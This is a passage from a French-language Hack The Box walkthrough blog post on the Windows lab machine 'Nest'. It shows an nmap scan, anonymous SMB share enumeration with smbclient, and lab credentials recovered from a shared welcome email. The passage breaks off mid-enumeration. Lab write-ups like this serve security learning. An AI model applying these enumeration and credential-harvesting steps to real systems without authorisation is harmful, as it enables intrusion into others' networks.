<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.80.0" />

    
    
    

<title>Hack The Box - Nest • Haax - Personal Blog</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Nest"/>
<meta name="twitter:description" content="Nest est une machine Windows considérée comme facile/moyenne. Un accès SMB anonyme permet de récupérer un premier compte non privilégié. La récupération d&rsquo;un mot de passe chiffré et des sources d&rsquo;un projet Visual Basic permet, après manipulation de récupérer le mot de passe de l&rsquo;utilisateur en clair. L&rsquo;escalade de privilège se fait au travers d&rsquo;un service de &ldquo;reporting&rdquo; permettant ainsi de récupérer une nouvelle chaine chiffrée sur le disque. Le déchiffrement de cette dernière permet un accès administrate"/>

<meta property="og:title" content="Hack The Box - Nest" />
<meta property="og:description" content="Nest est une machine Windows considérée comme facile/moyenne. Un accès SMB anonyme permet de récupérer un premier compte non privilégié. La récupération d&rsquo;un mot de passe chiffré et des sources d&rsquo;un projet Visual Basic permet, après manipulation de récupérer le mot de passe de l&rsquo;utilisateur en clair. L&rsquo;escalade de privilège se fait au travers d&rsquo;un service de &ldquo;reporting&rdquo; permettant ainsi de récupérer une nouvelle chaine chiffrée sur le disque. Le déchiffrement de cette dernière permet un accès administrate" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/nest/" />
<meta property="article:published_time" content="2020-06-07T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-07T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    

</head>


    <body >
        
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      
      
          <a href="https://haax9.github.io">
          
          
          
          <div class="author-image">
            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
        
      <p class="site__description">
        <a href="https://haax9.github.io">
         Infosec articles &amp; CTF Writeups 
      </a>
      </p>
    </div>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/fr/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/walkthroughs/">
						<span>Walkthroughs</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/writeups/">
						<span>Write-Ups</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/about/">
						<span>À Propos</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/conferences/">
						<span>Conférences</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="https://cheatsheet.haax.fr">
						<span>Cheatsheet</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/Haax9_" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
  
	
	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
	
	
	
	&nbsp;<a href="https://haax.fr/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
	</section>

    </p>
    <div class="langSection">
      
      
      <a rel="alternate" href="/en/walkthroughs/hackthebox/nest/" hreflang="en" lang="en" class="langLink">English</a>
      <a rel="alternate" href="/en/walkthroughs/hackthebox/nest/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
      </div>
    <p class="copyright">
      &copy; 2023 Haax.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
  <div>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Hack The Box - Nest</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Jun 7, 2020
    
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 16 min read
</div>


  </header>
  <div class="post">
    <p>Nest est une machine Windows considérée comme facile/moyenne. Un accès SMB anonyme permet de récupérer un premier compte non privilégié. La récupération d&rsquo;un mot de passe chiffré et des sources d&rsquo;un projet Visual Basic permet, après manipulation de récupérer le mot de passe de l&rsquo;utilisateur en clair. L&rsquo;escalade de privilège se fait au travers d&rsquo;un service de &ldquo;reporting&rdquo; permettant ainsi de récupérer une nouvelle chaine chiffrée sur le disque. Le déchiffrement de cette dernière permet un accès administrate</p>
<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
<h2 id="découverte--énumération">Découverte / Énumération</h2>
<p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.178

Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.178
Host is up <span style="color:#f92672">(</span>0.030s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">9999</span> filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR &lt;Directory_Name&gt;
|     RUNQUERY &lt;Query_ID&gt;
|     DEBUG &lt;Password&gt;
|_    HELP &lt;Command&gt;
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V<span style="color:#f92672">=</span>7.70%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>2/23%Time<span style="color:#f92672">=</span>5E52D49C%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
SF:LL,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLin
SF:es,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognise
</span><span style="color:#e6db74">SF:d\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x2
</span><span style="color:#e6db74">SF:0V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,3A,<span style="color:#e6db74">&#34;\r\
</span><span style="color:#e6db74">SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20comma
</span><span style="color:#e6db74">SF:nd\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
</span><span style="color:#e6db74">SF:n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Repo
</span><span style="color:#e6db74">SF:rting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,21,<span style="color:#e6db74">&#34;\r\nHQK
</span><span style="color:#e6db74">SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,21,<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,F2,<span style="color:#e6db74">&#34;\r\nHQK\
</span><span style="color:#e6db74">SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nThis\x20service\x20allows\
</span><span style="color:#e6db74">SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
</span><span style="color:#e6db74">SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
</span><span style="color:#e6db74">SF:\r\n\r\nLIST\r\nSETDIR\x20&lt;Directory_Name&gt;\r\nRUNQUERY\x20&lt;Query_ID&gt;\r\
</span><span style="color:#e6db74">SF:nDEBUG\x20&lt;Password&gt;\r\nHELP\x20&lt;Command&gt;\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,21,<span style="color:#e6db74">&#34;\r
</span><span style="color:#e6db74">SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,21,<span style="color:#e6db74">&#34;\
</span><span style="color:#e6db74">SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,21,<span style="color:#e6db74">&#34;\r\nH
</span><span style="color:#e6db74">SF:QK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,21,<span style="color:#e6db74">&#34;\r\nHQK
</span><span style="color:#e6db74">SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,21,<span style="color:#e6db74">&#34;\r\nHQK\x20
</span><span style="color:#e6db74">SF:Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,3A,<span style="color:#e6db74">&#34;\r\nHQ
</span><span style="color:#e6db74">SF:K\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\
</span><span style="color:#e6db74">SF:r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
</span><span style="color:#e6db74">SF:&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\
</span><span style="color:#e6db74">SF:n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPBindReq,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
</span><span style="color:#e6db74">SF:&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\
</span><span style="color:#e6db74">SF:r\nUnrecognised\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk-RC,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting
</span><span style="color:#e6db74">SF:\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporti
</span><span style="color:#e6db74">SF:ng\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Ser
</span><span style="color:#e6db74">SF:vice\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>;
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Device type: general purpose|phone|specialized
Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 8|Phone|2008|7|8.1|Vista <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> Professional or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Uptime guess: 1.473 days <span style="color:#f92672">(</span>since Sat Feb <span style="color:#ae81ff">22</span> 09:20:24 2020<span style="color:#f92672">)</span>
TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">262</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
IP ID Sequence Generation: Incremental

Host script results:
|_clock-skew: mean: 1m52s, deviation: 0s, median: 1m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-23 20:42:32
|_  start_date: 2020-02-22 09:23:12

NSE: Script Post-scanning.
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1012.52 seconds
           Raw packets sent: <span style="color:#ae81ff">30720</span> <span style="color:#f92672">(</span>1.357MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">663</span> <span style="color:#f92672">(</span>31.066KB<span style="color:#f92672">)</span>
</code></pre></div><p>Le scan révèle la présence d&rsquo;un port 445, classique, mais également le port 4386, qui semble être un service de &ldquo;Reporting&rdquo;.</p>
<h2 id="accès-smb-anonyme-et-récupération-dun-compte-temporaire">Accès SMB anonyme et récupération d&rsquo;un compte temporaire</h2>
<p>Pour les première recherches, on se tourne vers un service que l&rsquo;on connait déjà, les partages SMB. Grâce à une connexion anonyme, nous sommes en mesure de lister les partages visibles.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> -L <span style="color:#ae81ff">\\\\</span>10.10.10.178
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Data            Disk      
    IPC$            IPC       Remote IPC
    Secure$         Disk      
    Users           Disk      
SMB1 disabled -- no workgroup available
</code></pre></div><p>À priori, 3 partages peuvent être intéressants pour le moment :</p>
<ul>
<li>Data</li>
<li>Secure$</li>
<li>USers$</li>
</ul>
<p>On commencer par regarder du côté du partage <code>Users$</code> ce qui permet entre autres de récupérer la liste des utilisateurs de la machine. Utile !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Users
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 00:04:21 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 00:04:21 <span style="color:#ae81ff">2020</span>
  Administrator                       D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:08:23 <span style="color:#ae81ff">2019</span>
  C.Smith                             D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:21:44 <span style="color:#ae81ff">2020</span>
  L.Frost                             D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:03:01 <span style="color:#ae81ff">2019</span>
  R.Thompson                          D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:02:50 <span style="color:#ae81ff">2019</span>
  TempUser                            D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:55:56 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545336</span> blocks available
</code></pre></div><p>Par curiosité, on tente également d&rsquo;aller faire un tour sur le partage <code>Secure$</code>. Comme son nom l&rsquo;indique, ce dernier est plus sécurisé et il n&rsquo;est pas possible de s&rsquo;y connecter sans compte utilisateur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Secure$
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\*</span>
</code></pre></div><p>Dernière piste, le partage <code>Data</code> sur lequel on a accès à plusieurs éléments.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Data   
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:53:46 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:53:46 <span style="color:#ae81ff">2019</span>
  IT                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:58:07 <span style="color:#ae81ff">2019</span>
  Production                          D        <span style="color:#ae81ff">0</span>  Mon Aug  <span style="color:#ae81ff">5</span> 23:53:38 <span style="color:#ae81ff">2019</span>
  Reports                             D        <span style="color:#ae81ff">0</span>  Mon Aug  <span style="color:#ae81ff">5</span> 23:53:44 <span style="color:#ae81ff">2019</span>
  Shared                              D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:07:51 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545336</span> blocks available
</code></pre></div><p>Après quelques recherches, on tombe rapidement sur un fichier texte &ldquo;Welcome Email&rdquo;. Ce type de fichier peut être très intéressant car peut contenir des informations telles que des comptes par défaut.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\S</span>hared<span style="color:#ae81ff">\T</span>emplates<span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:08:01 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:08:01 <span style="color:#ae81ff">2019</span>
  Welcome Email.txt                   A      <span style="color:#ae81ff">425</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:55:36 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545577</span> blocks available

smb: <span style="color:#ae81ff">\S</span>hared<span style="color:#ae81ff">\T</span>emplates<span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Welcome Email.txt&#34;</span>
getting file <span style="color:#ae81ff">\S</span>hared<span style="color:#ae81ff">\T</span>emplates<span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\W</span>elcome Email.txt of size <span style="color:#ae81ff">425</span> as Welcome Email.txt <span style="color:#f92672">(</span>3.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.9 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><p>La récupération de ce fichier donne effectivement les informations souhaitées, puisqu&rsquo;un compte, accompagné de son mot de passe, est identifié !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat Welcome<span style="color:#ae81ff">\ </span>Email.txt 
We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location: 
<span style="color:#ae81ff">\\</span>HTB-NEST<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\&lt;</span>USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below <span style="color:#66d9ef">until</span> all systems have been set up <span style="color:#66d9ef">for</span> you.

Username: TempUser
Password: welcome2019

Thank you
HR%        
</code></pre></div><p>On file de ce pas tenter une connexion avec notre nouveau compte du côté du partage <code>Secure$</code>, non accessible auparavant et bingo, celui ci devient à notre portée.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;TempUser&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Secure$
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\T</span>empUser<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:08:12 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:08:12 <span style="color:#ae81ff">2019</span>
  Finance                             D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:40:13 <span style="color:#ae81ff">2019</span>
  HR                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:08:11 <span style="color:#ae81ff">2019</span>
  IT                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 12:59:25 <span style="color:#ae81ff">2019</span>
</code></pre></div><h2 id="énumération-et-récupération-du-projet-vb">Énumération et récupération du projet VB</h2>
<p>Ici commence une nouvelle phase d&rsquo;énumération. En effet, l&rsquo;ensemble des éléments non accessibles auparavant doivent être analysés, à la recherche de nouvelles informations.
Cela comprend notamment une portion du partage <code>Data$</code> auparavant inaccessible.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;TempUser&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Data    
Enter WORKGROUP<span style="color:#ae81ff">\T</span>empUser<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> cd IT
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:58:07 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:58:07 <span style="color:#ae81ff">2019</span>
  Archive                             D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 00:33:58 <span style="color:#ae81ff">2019</span>
  Configs                             D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:59:34 <span style="color:#ae81ff">2019</span>
  Installs                            D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:08:30 <span style="color:#ae81ff">2019</span>
  Reports                             D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 01:09:13 <span style="color:#ae81ff">2020</span>
  Tools                               D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 00:33:43 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545577</span> blocks available
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\&gt;</span> cd
